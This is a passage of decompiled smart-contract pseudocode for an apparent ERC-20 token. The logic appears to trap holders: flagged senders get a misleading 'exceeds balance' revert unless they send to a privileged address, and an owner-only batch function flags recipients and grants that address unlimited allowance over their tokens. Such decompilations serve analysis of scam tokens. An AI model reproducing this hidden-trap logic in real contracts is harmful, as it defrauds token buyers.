                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_878 + idx + 68] = mem[_796 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_878 + 100] = mem[_878 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _878 + -mem[64] + 132
                                    else:
                                        stor2[address(msg.sender)] = 1
                                        mem[0] = msg.sender
                                        mem[32] = 1
                                        stor1[address(msg.sender)] = 0
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _836 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_836] = 38
                                        mem[_836 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _612 > balanceOf[address(msg.sender)]:
                                            _934 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_934 + idx + 68] = mem[_836 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_934 + 100] = mem[_934 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _934 + -mem[64] + 132
        else:
            if msg.sender == _owner:
                stor11 = mem[(32 * idx) + 140 len 20]
                if not msg.sender:
                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                if not mem[(32 * idx) + 140 len 20]:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                _620 = mem[64]
                mem[64] = mem[64] + 96
                mem[_620] = 38
                mem[_620 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                mem[32] = 0
                if _612 > balanceOf[address(msg.sender)]:
                    _631 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 38
                    idx = 0
                    while idx < 38:
                        mem[_631 + idx + 68] = mem[_620 + idx + 32]
                        idx = idx + 32
                        continue 
                    mem[_631 + 100] = mem[_631 + 126 len 6]
                    revert with memory
                      from mem[64]
                       len _631 + -mem[64] + 132
            else:
                if msg.sender == stor11:
                    if _owner != msg.sender:
                        if not msg.sender:
                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                        _725 = mem[64]
                        mem[64] = mem[64] + 96
                        mem[_725] = 38
                        mem[_725 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                        mem[32] = 0
                        if _612 > balanceOf[address(msg.sender)]:
                            _807 = mem[64]
                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                            mem[mem[64] + 4] = 32
                            mem[mem[64] + 36] = 38
                            idx = 0
                            while idx < 38:
                                mem[_807 + idx + 68] = mem[_725 + idx + 32]
                                idx = idx + 32
                                continue 
                            mem[_807 + 100] = mem[_807 + 126 len 6]
                            revert with memory
                              from mem[64]
                               len _807 + -mem[64] + 132
                    else:
                        if mem[(32 * idx) + 140 len 20] != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _766 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_766] = 38
                            mem[_766 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _612 > balanceOf[address(msg.sender)]:
                                _848 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_848 + idx + 68] = mem[_766 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_848 + 100] = mem[_848 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _848 + -mem[64] + 132
                        else:
                            stor3 = mem[(32 * idx) + (32 * arg1.length) + 160]
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _810 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_810] = 38
                            mem[_810 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _612 > balanceOf[address(msg.sender)]:
                                _897 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_897 + idx + 68] = mem[_810 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_897 + 100] = mem[_897 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _897 + -mem[64] + 132
                else:
                    if mem[(32 * idx) + 140 len 20] == _owner:
                        if _owner != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _780 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_780] = 38
                            mem[_780 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _612 > balanceOf[address(msg.sender)]:
                                _859 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_859 + idx + 68] = mem[_780 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_859 + 100] = mem[_859 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _859 + -mem[64] + 132
                        else:
                            if mem[(32 * idx) + 140 len 20] != msg.sender:
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _823 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_823] = 38
                                mem[_823 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _612 > balanceOf[address(msg.sender)]:
                                    _909 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_909 + idx + 68] = mem[_823 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_909 + 100] = mem[_909 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _909 + -mem[64] + 132
                            else:
                                stor3 = mem[(32 * idx) + (32 * arg1.length) + 160]
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _862 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_862] = 38
                                mem[_862 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _612 > balanceOf[address(msg.sender)]:
                                    _975 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_975 + idx + 68] = mem[_862 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_975 + 100] = mem[_975 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _975 + -mem[64] + 132
                    else:
                        mem[0] = msg.sender
                        mem[32] = 1
                        if bool(stor1[address(msg.sender)]) == 1:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _735 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_735] = 38
                            mem[_735 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _612 > balanceOf[address(msg.sender)]:
                                _820 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_820 + idx + 68] = mem[_735 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_820 + 100] = mem[_820 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _820 + -mem[64] + 132
                        else:
                            mem[0] = msg.sender
                            mem[32] = 2
                            if bool(stor2[address(msg.sender)]) == 1:
                                if msg.sender == stor11:
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _855 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_855] = 38
                                    mem[_855 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _612 > balanceOf[address(msg.sender)]:
                                        _965 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_965 + idx + 68] = mem[_855 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_965 + 100] = mem[_965 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _965 + -mem[64] + 132
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor12:
                                        revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _904 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_904] = 38
                                    mem[_904 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _612 > balanceOf[address(msg.sender)]:
                                        _1029 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_1029 + idx + 68] = mem[_904 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1029 + 100] = mem[_1029 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1029 + -mem[64] + 132
                            else:
                                if mem[(32 * idx) + (32 * arg1.length) + 160] >= stor3:
                                    if msg.sender == stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _900 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_900] = 38
                                        mem[_900 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _612 > balanceOf[address(msg.sender)]:
                                            _1019 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1019 + idx + 68] = mem[_900 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1019 + 100] = mem[_1019 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1019 + -mem[64] + 132
                                    else:
                                        if mem[(32 * idx) + 140 len 20] != stor12:
                                            revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _960 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_960] = 38
                                        mem[_960 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _612 > balanceOf[address(msg.sender)]:
                                            _1078 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1078 + idx + 68] = mem[_960 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1078 + 100] = mem[_1078 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1078 + -mem[64] + 132
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _853 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_853] = 38
                                        mem[_853 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _612 > balanceOf[address(msg.sender)]:
                                            _962 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_962 + idx + 68] = mem[_853 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_962 + 100] = mem[_962 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _962 + -mem[64] + 132
                                    else:
                                        stor2[address(msg.sender)] = 1
                                        mem[0] = msg.sender
                                        mem[32] = 1
                                        stor1[address(msg.sender)] = 0
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _902 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_902] = 38
                                        mem[_902 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _612 > balanceOf[address(msg.sender)]:
                                            _1024 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1024 + idx + 68] = mem[_902 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1024 + 100] = mem[_1024 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1024 + -mem[64] + 132
        ('le', ('var', '_612'), ('stor', ('map', ('mask_shl', 160, 0, 0, 'msg.sender'), ('name', 'balanceOf', 0))))
        balanceOf[address(msg.sender)] -= _612
        if balanceOf[address(_610)] + _612 < balanceOf[address(_610)]:
            revert with 0, 'SafeMath: addition overflow'
        mem[0] = address(_610)
        mem[32] = 0
        balanceOf[address(_610)] += _612
        mem[mem[64]] = _612
        emit Transfer(_612, msg.sender, address(_610));
        idx = idx + 1
        continue 
}

function sub_f6af5d06(?) payable {
    require calldata.size - 4 >= 96
    require arg2 <= 4294967296
    require arg2 + 36 <= calldata.size
    require arg2.length <= 4294967296 and arg2 + (32 * arg2.length) + 36 <= calldata.size
    mem[96] = arg2.length
    mem[128 len 32 * arg2.length] = call.data[arg2 + 36 len 32 * arg2.length]
    require arg3 <= 4294967296
    require arg3 + 36 <= calldata.size
    require arg3.length <= 4294967296 and arg3 + (32 * arg3.length) + 36 <= calldata.size
    mem[64] = (32 * arg2.length) + (32 * arg3.length) + 160
    mem[(32 * arg2.length) + 128] = arg3.length
    mem[(32 * arg2.length) + 160 len 32 * arg3.length] = call.data[arg3 + 36 len 32 * arg3.length]
    mem[(32 * arg2.length) + (32 * arg3.length) + 160] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg2.length:
        require idx < mem[96]
        _987 = mem[(32 * idx) + 128]
        require idx < mem[(32 * arg2.length) + 128]
        _989 = mem[(32 * idx) + (32 * arg2.length) + 160]
        if msg.sender == 0x9d39583c1b847b5eb61627f25f87ed29:
            revert with 0, '!A'
        if _owner != stor11:
            if msg.sender == _owner:
                if mem[(32 * idx) + 140 len 20] != msg.sender:
                    if not msg.sender:
                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                    if not mem[(32 * idx) + 140 len 20]:
                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                    _1050 = mem[64]
                    mem[64] = mem[64] + 96
                    mem[_1050] = 38
                    mem[_1050 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                    mem[32] = 0
                    if _989 > balanceOf[address(msg.sender)]:
                        _1122 = mem[64]
                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                        mem[mem[64] + 4] = 32
                        mem[mem[64] + 36] = 38
                        idx = 0
                        while idx < 38:
                            mem[_1122 + idx + 68] = mem[_1050 + idx + 32]
                            idx = idx + 32
                            continue 
                        mem[_1122 + 100] = mem[_1122 + 126 len 6]
                        revert with memory
                          from mem[64]
                           len _1122 + -mem[64] + 132
                    balanceOf[address(msg.sender)] -= _989
                    if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                        revert with 0, 'SafeMath: addition overflow'
                    mem[0] = address(_987)
                    mem[32] = 0
                    balanceOf[address(_987)] += _989
                    mem[mem[64]] = _989
                    emit Transfer(_989, msg.sender, address(_987));
                    if idx < arg1:
                        require idx < mem[96]
                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                        require idx < mem[96]
                        _1614 = mem[(32 * idx) + 128]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                        if not stor12:
                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                        mem[0] = stor12
                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                        mem[mem[64]] = -1
                        emit Approval(-1, address(_1614), stor12);
                else:
                    stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                    if not msg.sender:
                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                    if not mem[(32 * idx) + 140 len 20]:
                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                    _1082 = mem[64]
                    mem[64] = mem[64] + 96
                    mem[_1082] = 38
                    mem[_1082 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                    mem[32] = 0
                    if _989 > balanceOf[address(msg.sender)]:
                        _1163 = mem[64]
                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                        mem[mem[64] + 4] = 32
                        mem[mem[64] + 36] = 38
                        idx = 0
                        while idx < 38:
                            mem[_1163 + idx + 68] = mem[_1082 + idx + 32]
                            idx = idx + 32
                            continue 
                        mem[_1163 + 100] = mem[_1163 + 126 len 6]
                        revert with memory
                          from mem[64]
                           len _1163 + -mem[64] + 132
                    balanceOf[address(msg.sender)] -= _989
                    if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                        revert with 0, 'SafeMath: addition overflow'
                    mem[0] = address(_987)
                    mem[32] = 0
                    balanceOf[address(_987)] += _989
                    mem[mem[64]] = _989
                    emit Transfer(_989, msg.sender, address(_987));
                    if idx < arg1:
                        require idx < mem[96]
                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                        require idx < mem[96]
                        _1636 = mem[(32 * idx) + 128]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                        if not stor12:
                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                        mem[0] = stor12
                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                        mem[mem[64]] = -1
                        emit Approval(-1, address(_1636), stor12);
            else:
                if msg.sender == stor11:
                    if _owner != msg.sender:
                        if not msg.sender:
                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                        _1052 = mem[64]
                        mem[64] = mem[64] + 96
                        mem[_1052] = 38
                        mem[_1052 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                        mem[32] = 0
                        if _989 > balanceOf[address(msg.sender)]:
                            _1125 = mem[64]
                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                            mem[mem[64] + 4] = 32
                            mem[mem[64] + 36] = 38
                            idx = 0
                            while idx < 38:
                                mem[_1125 + idx + 68] = mem[_1052 + idx + 32]
                                idx = idx + 32
                                continue 
                            mem[_1125 + 100] = mem[_1125 + 126 len 6]
                            revert with memory
                              from mem[64]
                               len _1125 + -mem[64] + 132
                        balanceOf[address(msg.sender)] -= _989
                        if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                            revert with 0, 'SafeMath: addition overflow'
                        mem[0] = address(_987)
                        mem[32] = 0
                        balanceOf[address(_987)] += _989
                        mem[mem[64]] = _989
                        emit Transfer(_989, msg.sender, address(_987));
                        if idx < arg1:
                            require idx < mem[96]
                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                            require idx < mem[96]
                            _1618 = mem[(32 * idx) + 128]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                            if not stor12:
                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                            mem[0] = stor12
                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                            mem[mem[64]] = -1
                            emit Approval(-1, address(_1618), stor12);
                    else:
                        if mem[(32 * idx) + 140 len 20] != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1084 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1084] = 38
                            mem[_1084 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _989 > balanceOf[address(msg.sender)]:
                                _1168 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1168 + idx + 68] = mem[_1084 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1168 + 100] = mem[_1168 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1168 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _989
                            if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_987)
                            mem[32] = 0
                            balanceOf[address(_987)] += _989
                            mem[mem[64]] = _989
                            emit Transfer(_989, msg.sender, address(_987));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1637 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1637), stor12);
                        else:
                            stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1128 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1128] = 38
                            mem[_1128 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _989 > balanceOf[address(msg.sender)]:
                                _1208 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1208 + idx + 68] = mem[_1128 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1208 + 100] = mem[_1208 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1208 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _989
                            if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_987)
                            mem[32] = 0
                            balanceOf[address(_987)] += _989
                            mem[mem[64]] = _989
                            emit Transfer(_989, msg.sender, address(_987));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1663 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
